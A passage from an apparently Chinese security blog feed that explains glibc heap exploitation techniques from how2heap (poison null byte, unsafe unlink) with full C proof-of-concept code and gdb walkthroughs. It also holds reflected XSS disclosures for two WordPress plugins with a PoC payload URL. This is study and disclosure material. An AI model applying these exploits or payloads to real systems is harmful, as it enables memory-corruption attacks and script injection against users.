class="hljs-type">uint8_t</span>* b2;<br><span class="hljs-type">uint8_t</span>* d;<br><span class="hljs-type">void</span> *barrier;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);<br>a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><span class="hljs-type">int</span> real_a_size = <span class="hljs-built_in">malloc_usable_size</span>(a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span><br><span class="hljs-string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);<br><br><span class="hljs-comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span><br><span class="hljs-comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span><br><span class="hljs-comment"> * the amount requested plus some amount required for the metadata. */</span><br>b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br>c = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br>barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span><br><span class="hljs-string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);<br><br><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br><span class="hljs-comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span><br><span class="hljs-comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span><br><span class="hljs-comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span><br><span class="hljs-comment">//*(size_t*)(b+0x1f0) = 0x200;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span><br><span class="hljs-string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);<br><span class="hljs-comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span><br><span class="hljs-comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span><br>*(<span class="hljs-type">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br><span class="hljs-comment">// this technique works by overwriting the size metadata of a free chunk</span><br><span class="hljs-built_in">free</span>(b);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br>a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br><span class="hljs-type">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);<br><br><span class="hljs-comment">// This malloc will result in a call to unlink on the chunk where b was.</span><br><span class="hljs-comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span><br><span class="hljs-comment">// will detect the heap corruption now.</span><br><span class="hljs-comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span><br><span class="hljs-comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span><br><span class="hljs-comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span><br><span class="hljs-comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,<br>*((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br>b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b1: %p\n&quot;</span>,b1);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span><br><span class="hljs-string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span><br><span class="hljs-string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);<br><span class="hljs-comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span><br><br>b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b2: %p\n&quot;</span>,b2);<br><br><span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(b1);<br><span class="hljs-built_in">free</span>(c);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);<br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;d: %p\n&quot;</span>,d);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);<br><span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New b2 content:\n%s\n&quot;</span>,b2);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span><br><span class="hljs-string">&quot;for the clear explanation of this technique.\n&quot;</span>);<br><br><span class="hljs-built_in">assert</span>(<span class="hljs-built_in">strstr</span>(b2, <span class="hljs-string">&quot;DDDDDDDDDDDD&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>首先申请四个chunk a,b,c和barrier，如图所示<br><img src="https://i.imgur.com/GFe7I8S.png"></p><p><code>*(size_t*)(b+0x1f0) = 0x200</code>是为了伪造presize的大小为0x200</p><p><img src="https://i.imgur.com/E07xkDD.png"></p><p><code>free(b)</code>之后四个chunk的状态如图所示，我们可以看到chunk c的真实的prevsize为0x210<br><img src="https://i.imgur.com/b0pSajZ.png"></p><p>然后<code>a[real_a_size] = 0</code>缩小chunk b的大小</p><p><img src="https://i.imgur.com/MnER5HG.png"></p><p>因为之前<code>*(size_t*)(b+0x1f0) = 0x200</code>已经伪造好了<code>chunksize(P) == prev_size (next_chunk(P)</code>因此可以通过检查</p><p>因为之前b已经free掉了，它现在被放到了unsortedbin中，申请一个比它小的0x100大小的堆块，会从已经放入到unsortedbin的b中分割一个b1，剩下的部分还在unsortedbin中，现在堆块状态如图所示。fake chunk是一个大小为0的chunk，分割b的话会缩小它的prevsize<br><img src="https://i.imgur.com/vD4On0B.png"></p><p>此时<code>b2 = malloc(0x80)</code>,分配填充内容后堆状态如图所示<br><img src="https://i.imgur.com/BFTytuO.png"></p><p>此时<code>free(b1)</code>和<code>free(c)</code>后，因为c的prev_size还是210，因此会忽略掉b2，直接b1和c合并，重新<code>malloc(d)</code>后会对b2造成overlap，输出b2的内容会发现变成了D。</p><h2 id="poison-null-byte原理"><a href="#poison-null-byte原理" class="headerlink" title="poison null byte原理"></a>poison null byte原理</h2><p><img src="https://i.imgur.com/adBbFgf.png"><br>这张图来源于<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.7_heap_exploit_2.html">ctf-all-in-one</a>,里面讲的会详细点，可以看一看。</p><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><p>这里的利用主要是跟着<a href="https://tttang.com/archive/1614/">这篇文章</a>来学习的，具体的思想可以看原文，这里只是跟着更细致地调试一下。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> *tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>    <span class="hljs-type">void</span> *pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10000</span> - ((<span class="hljs-type">long</span>)tmp&amp;<span class="hljs-number">0xffff</span>) - tmp[<span class="hljs-number">-1</span>]);<br>    <span class="hljs-type">void</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-type">char</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">void</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">void</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">free</span>(b);<br>    <span class="hljs-built_in">free</span>(prev);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>); <span class="hljs-comment">// b --&gt; prev --&gt; a in largebin</span><br>    <span class="hljs-type">long</span> *prev2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">//cash prev out</span><br>    prev2[<span class="hljs-number">1</span>] = <span class="hljs-number">0x501</span>;  <span class="hljs-comment">//fake size,here must long type</span><br>    prev2[<span class="hljs-number">0x500</span>/<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>)] = <span class="hljs-number">0x500</span>;<br>    <span class="hljs-type">short</span> *b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>); <span class="hljs-comment">// cash b out</span><br>    b2[<span class="hljs-number">0</span>] = <span class="hljs-number">16</span>; <span class="hljs-comment">//change fd</span><br>    <span class="hljs-type">void</span> *a2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);  <span class="hljs-comment">// cash a out</span><br>    <span class="hljs-built_in">free</span>(a2);     <span class="hljs-comment">// into unsorted bin</span><br>    <span class="hljs-built_in">free</span>(victim); <span class="hljs-comment">// into unsorted bin</span><br>    <span class="hljs-type">short</span> *a3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>); <span class="hljs-comment">//make a3&#x27;s bk not pointing to bin(now to victim)</span><br>    a3[<span class="hljs-number">4</span>] = <span class="hljs-number">16</span>; <span class="hljs-comment">// so just need to change the last 2 bytes of a3&#x27;s bk</span><br>    <span class="hljs-type">char</span> *victim2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>); <span class="hljs-comment">//cash out from unsorted bin</span><br>    victim2[<span class="hljs-number">-8</span>] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// use VULNERABILITY  clear prev_inuse bit</span><br>    <span class="hljs-comment">// backward consolidate, use prev2&#x27;s fd_nextsize and bk_nextsize to fake fd and bk</span><br>    <span class="hljs-built_in">free</span>(victim2);<br>    <span class="hljs-type">long</span> *merged = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">assert</span>((<span class="hljs-type">long</span>)merged - (<span class="hljs-type">long</span>)prev2 == <span class="hljs-number">0x10</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译的时候记得换成对应的libc版本</p><p>原文中也提到了，2.29之后增加了很多检查，除了要绕过<code>chunksize(p) == prevsize</code>之外，还要满足unlink的条件，unlink可以查看我之前的文章。</p><p>首先解释一下从unsortedbin双向链表里面取出来一个chunk时，fd指针会被破坏是什么意思。在malloc的时候，会检查unsortedbin中有没有相应大小的chunk，有的话将其取出来，然后将这个块之前的chunk都放入largebin中，因此取出来的时候这个堆块的fd指针是指向表头的。</p><p>为了解决这个难点，通过把unsortedbin整理到largebin的方式来保存fd指针，这一步可以通过malloc一个比unsortedbin中所有块都大的块来实现，这时候unsortedbin都被放到了largebin中，可以将fd_nextsize指针来作为fd指针。</p><p>接下来我们用gdb调试一下就会很清楚</p><p>首先运行到<code>free(a)</code>之前停下来，这时候已经完成了堆块的初始化布局。我理解的tmp和pad的作用就是为了让prev的地址从0x????00??开始。<br><img src="https://i.imgur.com/M4dpJkI.png"><br>然后把a,b,prev都free之后会进入unsortedbin中，再malloc(0x1000)后会进入到largebin中。<br><img src="https://i.imgur.com/ONp1Die.png"></p><p><code>free(a2)</code>之前，堆块的状态如图所示，因为在malloc b2之前，prev已经largebin中取出，因此此时b的fd指向的是a，b2[0] &#x3D; 16的目的就是将0a30变成0010，此时b2的fd指向的就是prev中伪造的fake chunk。</p><p><img src="https://i.imgur.com/FSy6nIL.png"></p><p>之后又free(a2)和free(victim)，此时在unsortedbin中的顺序为victim-&gt;a2-&gt;p，此时a2的bk指向的是victim，此时只需要a3[4]&#x3D;16像刚才修改fd那样将低2字节从0510变为0010即可<br><img src="https://i.imgur.com/MfqXcsJ.png"></p><p>这时候prev的unlink的检测已经准备好了，然后重新malloc victim后修改它的prev_inuse位为0，假装前面的fake chunk处于空闲状态，因此free（victim）后就会和prev2合并。</p><p>这张图很清楚的表明了程序的整个过程，堆块a和b就是为了让prev满足unlink的检测，不断地free和malloc地过程是为了将其放到bin里去自动构造fd和bk。<br><img src="https://i.imgur.com/08lqalM.png"></p><p>因此利用步骤为：</p><ol><li>申请chunk，低第2字节对齐</li><li>设置fake chunk，p-&gt;fd&#x3D;a，p-&gt;bk&#x3D;b, p.size&#x3D;0x501</li><li>设置b-&gt;fd&#x3D;p</li><li>设置a-&gt;bk&#x3D;p</li><li>伪造prev_size和prev_inuse</li><li>free触发合并</li></ol><p>文章中也提到了可以通过后向或者前向合并来保留unsortedbin中的fd指针，可以通过在合并后地chunk里地原size部位写，这样\00字节就写入到了fd中，因此需要确保p的低2位为00。<br><img src="https://i.imgur.com/J2n2NaO.png"><br>比如通过合并H0和D保留了D中的fd指针，然后申请一个H1，在0x431的部分再重新写入0x431这样多余的00就会将本来指向c1的fd改为了指向c0。<code>add(6,0x500-8, &#39;6&#39;*0x488 + p64(0x431))</code></p>]]></content>
    
    
    <categories>
      
      <category>how2heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2022/06/21/unlink/"/>
    <url>/2022/06/21/unlink/</url>
    
    <content type="html"><![CDATA[<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="释放堆"><a href="#释放堆" class="headerlink" title="释放堆"></a>释放堆</h2><p>释放堆时会检查相邻地址的chunk是否处于空闲状态，若是就会合并这两个chunk。合并时会进行unlink操作，将相邻地址的chunk进行unlink解链操作从bins中拿出来。</p><p><strong>堆合并分为向前合并和向后合并。</strong></p><ul><li>向后合并指的是在释放P时和他的pre_chunk合并（也就是相邻小地址的chunk）</li><li>向前合并指的是在释放P时和他的next_chunk合并（也就是相邻大地址的chunk）</li></ul><h2 id="Unlink的流程"><a href="#Unlink的流程" class="headerlink" title="Unlink的流程"></a>Unlink的流程</h2><figure class="highlight xl"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><pre><code class="hljs xl">#define unlink(AV, P, BK, FD) &#123;<br>            <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))<br>              malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br>            FD = P-&gt;fd;<br>            BK = P-&gt;bk;<br>            <span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (FD-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> != P || BK-&gt;</span>fd != P, <span class="hljs-number">0</span>))<br>              malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br>            <span class="hljs-keyword">else</span> &#123;<br>                FD-&gt;bk = BK;<br>                BK-&gt;fd = FD;<br>                <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))<br>                    &amp;&amp; __<span class="hljs-function"><span class="hljs-title">builtin_expect</span> (P-&gt;</span>fd_nextsize != NULL, <span class="hljs-number">0</span>)) &#123;<br>                    <span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (P-&gt;</span><span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span>bk_nextsize != P, <span class="hljs-number">0</span>)<br>                        || __<span class="hljs-function"><span class="hljs-title">builtin_expect</span> (P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize != P, <span class="hljs-number">0</span>))<br>                      malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br>                    <span class="hljs-function"><span class="hljs-title">if</span> (FD-&gt;</span>fd_nextsize == NULL) &#123;<br>                        <span class="hljs-function"><span class="hljs-title">if</span> (P-&gt;</span>fd_nextsize == P)<br>                          FD-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = FD-&gt;</span>bk_nextsize = FD;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            FD-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = P-&gt;</span>fd_nextsize;<br>                            FD-&gt;<span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = P-&gt;</span>bk_nextsize;<br>                            P-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span>bk_nextsize = FD;<br>                            P-&gt;<span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize = FD;<br>                          &#125;<br>                      &#125; <span class="hljs-keyword">else</span> &#123;<br>                        P-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = P-&gt;</span>bk_nextsize;<br>                        P-&gt;<span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = P-&gt;</span>fd_nextsize;<br>                      &#125;                         &#125;<br>              &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>(代码来源于<a href="https://lantern.cool/note-pwn-unlink/">这里</a>)<br>首先会检查当前chunk的大小是否和相邻next_chunk的pre_size的大小进行比较。然后会检查<code>FD-&gt;bk == P || BK-&gt;fd == P</code>。</p><p>因此想要执行unlink攻击，需要设置fake free chunk的size字段和相邻next_chunk的pre_size大小相同。并且需要设置<code>P-&gt;fd = ptr - 0x18</code> <code>P-&gt;bk = ptr - 0x10</code>来绕过第二个检查。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">FD</span> <span class="hljs-operator">=</span> P-&gt;fd <span class="hljs-operator">=</span> ptr - <span class="hljs-number">0</span>x18<br><span class="hljs-attribute">BK</span> <span class="hljs-operator">=</span> P-&gt;bk <span class="hljs-operator">=</span> ptr - <span class="hljs-number">0</span>x10<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/2o2ecAL.png"></p><p>因此</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">BK</span>-&gt;fd = ptr - <span class="hljs-number">0</span>x10 + <span class="hljs-number">0</span>x10 = ptr<br><span class="hljs-attribute">FD</span>-&gt;bk = ptr - <span class="hljs-number">0</span>x18 + <span class="hljs-number">0</span>x18 = ptr<br></code></pre></td></tr></table></figure><p>可绕过检查。<br>解链后，<code>FD-&gt;bk = BK</code>即<code>*ptr = ptr - 0x10</code>, <code>BK-&gt;fd=FD</code>即<code>*ptr = ptr - 0x18</code>。</p><p>unlink 后，对 ptr 指向的内存进行写入，如 <code>‘A’*0x18 + free@got</code>, 使得 ptr 指向 <code>free@got</code>, 再次对 ptr 指向的内存进行写入，可以把 <code>free@got</code> 修改为 <code>system</code> 的地址，之后调用 <code>free</code> 可任意命令执行。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>这里用到的例子是<a href="https://github.com/shellphish/how2heap">how2heap</a>中的<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c">unsafe_unlink</a></p><p>首先<code>gcc unsafe_unlink.c -o unsafe_unlink -g</code>编译，然后gdb调试。<br>chunk0_ptr是全局指针变量，在这里是为了伪造和chunk1_ptr相邻且已经free的chunk，因此在<code>free(chunk1_ptr)</code>时就会触发fake chunk的unlink操作。</p><p><img src="https://i.imgur.com/fvLIQxT.png"><br>这段代码是为了伪造fake chunk，绕过上面提到的检查。</p><p><img src="https://i.imgur.com/9rm9aI8.png"><br>这段代码是为了修改chunk1_ptr的chunk头部来使chunk1的prev_size字段值等于fake chunk的大小并且prev_inuse字段为0来使fake chunk为空闲状态。</p><p>我们用gdb调试，可以看到chunk0和chunk1两个chunk<br><img src="https://i.imgur.com/hIs2t6A.png"></p><p>然后填充chunk0中的fake chunk<br><img src="https://i.imgur.com/jYVFTsy.png"></p><p>然后伪造chunk1的prev_size位和prev_inuse位<br><img src="https://i.imgur.com/g4d4e2s.png"><br>之后<code>free(chunk1_ptr)</code>就会使fake chunk触发unlink操作，使得chunk0_ptr指针指向<em>chunk0_ptr[2]，也就是&amp;chunk0_ptr - 0x18<br><img src="https://i.imgur.com/fxmSrmF.png"><br>此时让chunk0_ptr[3] &#x3D; victim_string，也就是</em>（chunk0_ptr + 0x18） &#x3D; *(&amp;chunk0_ptr - 0x18 + 0x18) &#x3D; chunk0_ptr &#x3D; victim_string<br><img src="https://i.imgur.com/vvmINxX.png"><br>可能画个图好理解一点</p><p><img src="https://i.imgur.com/bn72gva.png"></p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>在这里说一下为什么chunk0_ptr[2]要填&amp;chunk0_ptr-0x18，前面为什么要加取址符？<br>是因为在检查时，会检查<code>FD-&gt;bk == P</code>,即*((p-&gt;fd)+0x18)&#x3D;&#x3D;p，也就是FD指针+0x18的位置所填的内容应该是p,如果chunk0_ptr[2]也就是p-&gt;fd填的是p-0x18的话，左边&#x3D;p!&#x3D;p&#x3D;右边,所以这里需要填的应该是&amp;chunk0_ptr-0x18</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://lantern.cool/note-pwn-unlink/">Unlink</a></p>]]></content>
    
    
    <categories>
      
      <category>how2heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wp_check_email</title>
    <link href="/2022/04/22/wp-check-email/"/>
    <url>/2022/04/22/wp-check-email/</url>
    
    <content type="html"><![CDATA[<h1 id="Check-amp-Log-email-lt-x3D-1-0-5-Reflected-XSS（CVE-2022-1547）"><a href="#Check-amp-Log-email-lt-x3D-1-0-5-Reflected-XSS（CVE-2022-1547）" class="headerlink" title="Check &amp; Log email &lt;&#x3D; 1.0.5 Reflected XSS（CVE-2022-1547）"></a>Check &amp; Log email &lt;&#x3D; 1.0.5 Reflected XSS（CVE-2022-1547）</h1><p>In file <code>check-email\include\Core\UI\Page\Check_Email_Settings_Page.php</code> <code>$_GET[&#39;tab&#39;]</code>does not sanitized and leading a Reflected XSS.</p><p><img src="/2022/04/22/wp-check-email/1.png"></p><p>POC:</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/wp-admin/</span>admin.php?page=check-email-settings&amp;tab=<span class="hljs-string">&quot;&gt; &lt;input type=&quot;</span>text<span class="hljs-string">&quot; name=&quot;</span>test<span class="hljs-string">&quot; value=&quot;</span>xxxxx<span class="hljs-string">&quot; onmouseover=alert(1) test=&quot;</span><span class="hljs-string">&quot;/</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/22/wp-check-email/2.png"></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wp_call_now_button</title>
    <link href="/2022/04/22/wp-call-now-button/"/>
    <url>/2022/04/22/wp-call-now-button/</url>
    
    <content type="html"><![CDATA[<h1 id="call-now-button-lt-x3D-1-1-1-Reflected-XSS（CVE-2022-1455）"><a href="#call-now-button-lt-x3D-1-1-1-Reflected-XSS（CVE-2022-1455）" class="headerlink" title="call now button &lt;&#x3D; 1.1.1 Reflected XSS（CVE-2022-1455）"></a>call now button &lt;&#x3D; 1.1.1 Reflected XSS（CVE-2022-1455）</h1><p>In file <code>/call-now-button/src/admin/action/CnbActionViewEdit.php</code> <code>$_REQUEST[&quot;bid&quot;]</code>does not sanitized properly and leading a Reflected XSS.</p><p><img src="/2022/04/22/wp-call-now-button/1.png"></p><p>And <code>$button-&gt;type = &#39;SINGLE&#39; </code>defaultly.</p><p><img src="/2022/04/22/wp-call-now-button/2.png"></p><p>If we want to trigger this xss, we need activate premium first, it’s for free.</p><p><img src="/2022/04/22/wp-call-now-button/3.png"> </p><p>POC:</p><p>According to <a href="https://portswigger.net/research/xss-in-hidden-input-fields">this article</a>, To trigger this xss we need press Shift + Alt + X in windows or Ctrl + Alt + X In macos.</p><figure class="highlight awk"><table><tr><td class="gutter"><div 